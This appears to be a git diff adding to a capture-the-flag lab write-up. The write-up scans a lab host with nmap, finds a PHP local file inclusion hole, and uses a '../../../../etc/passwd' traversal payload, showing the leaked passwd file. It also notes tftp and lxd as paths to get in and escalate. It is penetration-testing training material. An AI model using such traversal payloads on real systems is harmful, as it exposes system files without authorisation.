@@ -22,7 +22,7 @@ tags:
   - nmap
 ---
 
-#Here are notes from the named target:
+Here are notes from the named target:
 Target is Linux
 Host name Included
 IP 10.10.10.55
@@ -54,5 +54,83 @@ Scanning 10.10.10.55 [1000 ports]
 ```
 
 only port found open was port 80 http so going to try UDP also
+
+```yaml
+nmap -sU -v 10.10.10.55
+```
+
+*This will take some time so going to check out web site in browser
+
+Look at the webpage does not seem too special so take a look at page source and I see this in the URL block
+
+```yaml
+view-source:http://10.10.10.55/?file=index.php#
+```
+
+the URL has a tell for possible local file include to try
+
+First it is *PHP
+
+Second it has *?file= in the URL
+
+The common path to check if it is vulnerable to LFI is the *../../../../etc/passwd file path
+
+So by using this URL *http://10.10.10.55/?file=../../../../etc/passwd
+
+We get the password file inserted at the top od the page for viewing. that also tells me if I can get a PHP reverse shell on the site I can use the browd\ser to fire it off
+
+```yaml
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+mike:x:1000:1000:mike:/home/mike:/bin/bash
+tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
+```
+
+*Oh look!* we have good intel here 
+It has an account for *tftp* - good way to get in. A user account named *mike* and a service called *lxd* which is a service to host virtural file systems in linux like vbox does on laptops. some easy reading indicated this is also a way to do Linux PE to get root if you grt on the box.
+
+We have tftp service running it seems:
+
+```yaml
+──(root💀kali)-[~]
+└─# nmap -sU -v 10.10.10.55
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 20:47 EST
+
+`
+`
+PORT   STATE         SERVICE
+*69/udp open|filtered tftp*
+```
+
+
+
+
+
 
 
